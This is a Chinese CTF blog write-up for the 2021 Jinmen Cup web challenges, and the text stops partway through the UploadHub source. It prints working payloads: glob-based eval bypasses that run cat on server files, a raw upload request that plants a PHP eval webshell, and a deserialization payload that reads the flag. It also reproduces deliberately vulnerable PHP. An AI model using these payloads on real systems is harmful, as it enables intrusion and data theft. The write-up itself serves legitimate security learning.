@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="加油💪 php无数字字母getshell 反序列化 文件上传 .htaccess 时间盲注 ssrf 302跳转">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021津门杯">
+<meta property="og:url" content="http://example.com/2021/05/14/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="加油💪 php无数字字母getshell 反序列化 文件上传 .htaccess 时间盲注 ssrf 302跳转">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210514224928587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210514224942846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210514230126653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210514230140112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-05-14T15:11:17.408Z">
+<meta property="article:modified_time" content="2021-05-14T15:11:09.659Z">
+<meta property="article:author" content="程勇胜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210514224928587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+
+<link rel="canonical" href="http://example.com/2021/05/14/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2021津门杯 | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">54</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/14/2021%E6%B4%A5%E9%97%A8%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="程勇胜">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021津门杯
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-14 23:11:17 / 修改时间：23:11:09" itemprop="dateCreated datePublished" datetime="2021-05-14T23:11:17+08:00">2021-05-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="加油💪"><a href="#加油💪" class="headerlink" title="加油💪"></a>加油💪</h1><ol>
+<li>php无数字字母getshell</li>
+<li>反序列化</li>
+<li>文件上传 .htaccess</li>
+<li>时间盲注</li>
+<li>ssrf 302跳转<a id="more"></a>
+<h1 id="Hate-php"><a href="#Hate-php" class="headerlink" title="Hate_php"></a>Hate_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+一看无数字字母getshell</li>
+</ol>
+<p>payload:  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ?code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? &#x2F;*&#96;?&gt;  尝试了几个文件没回显，索性直接读取所有文件</span><br><span class="line"></span><br><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;bin&#x2F;cat &#x2F;*&#96;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>放几个连接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/160582">2018安恒杯 - 9月月赛Writeup</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/">PHP不使用数字,字母和下划线写shell | Smi1e</a></p>
+<p>还有这样 php临时文件利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST http:&#x2F;&#x2F;122.112.214.101:20004&#x2F;?code&#x3D;?&gt;&lt;?&#x3D;&#96;.+&#x2F;%3f%3f%3f&#x2F;%3f%3f%3f%3f%3f%3f%3f%3f[%3f-[]&#96;%3b?&gt; HTTP&#x2F;1.1</span><br><span class="line">&#x2F;&#x2F;(?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[?-[]&#96;;?&gt;)</span><br><span class="line">Host: 122.112.214.101:20004</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36 Edg&#x2F;90.0.818.51</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6</span><br><span class="line">Content-Type:multipart&#x2F;form-data;boundary&#x3D;--------123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 105</span><br><span class="line"></span><br><span class="line">----------123</span><br><span class="line">Content-Disposition:form-data;name&#x3D;&quot;file&quot;;filename&#x3D;&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;?php eval(\$_POST[&#39;jan&#39;]);&quot; &gt; shell.php</span><br><span class="line">----------123--</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="Power-cut"><a href="#Power-cut" class="headerlink" title="Power_cut"></a>Power_cut</h1><p>扫目录得：.index.php.swp</p>
+<p>恢复：<code>vim -r index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$initMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$exitMsg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// initialise variables</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initMsg=<span class="string">&quot;#--session started--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exitMsg=<span class="string">&quot;#--session end--#\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logFile =  <span class="variable">$file</span>;</span><br><span class="line">        readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fd</span>=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fd</span>,<span class="variable">$msg</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        fclose(<span class="variable">$fd</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weblogfile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = preg_replace(<span class="string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log</span> = str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$log</span>);</span><br><span class="line"><span class="variable">$log_unser</span> = unserialize(<span class="variable">$log</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="number">14</span>级大风停电了.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试了好多，就是<code>不执行__construct()</code></p>
+<p>看其他师傅博客说：</p>
+<blockquote>
+<p>但是weblog是序列化出来的，不会执行到__construct()方法</p>
+</blockquote>
+<p>还能利用的就是 <code>readfile()</code> </p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class weblog &#123;</span><br><span class="line">    public $weblogfile &#x3D; &#39;&#x2F;flflagag&#39;;  &#x2F;&#x2F;绕过waf</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $flag&#x3D;&quot;system(&#39;cat &#x2F;flag&#39;)&quot;;</span><br><span class="line">        echo &quot;$flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        &#x2F;&#x2F; self::waf($this-&gt;filepath);</span><br><span class="line">        $obj &#x3D; new logger($this-&gt;weblogfile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new weblog();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h1><p>题目给了有源码和配置文件</p>
+<p>能上传，不解析</p>
+<p>附件：config.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>=mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;shuyu&quot;</span>); </span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_error(<span class="variable">$conn</span>))</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;���� MySQL ʧ��: &quot;</span> . mysqli_connect_error(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;from&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$value</span>= str_ireplace(<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">     <span class="variable">$_GET</span>[<span class="variable">$key</span>] =<span class="variable">$value</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;生而为人，我很抱歉&lt;/title&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;  </span><br><span class="line">        &lt;h1&gt;电影太仁慈，总能让错过的人重新相遇；生活不一样，有的人说过再见就再也不见了 -网易云&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span></span><br><span class="line">enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;filename:&lt;/label&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt; </span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">        &lt;/form&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$upload</span> = <span class="string">&#x27;upload/&#x27;</span>.md5(<span class="string">&quot;shuyu&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$upload</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$upload</span>.<span class="string">&#x27;/index.html&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$allow_type</span>=<span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;bmp&quot;</span>,<span class="string">&quot;tar&quot;</span>,<span class="string">&quot;zip&quot;</span>);</span><br><span class="line">        <span class="variable">$fileext</span> = substr(strrchr(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span> &amp;&amp; !in_array(<span 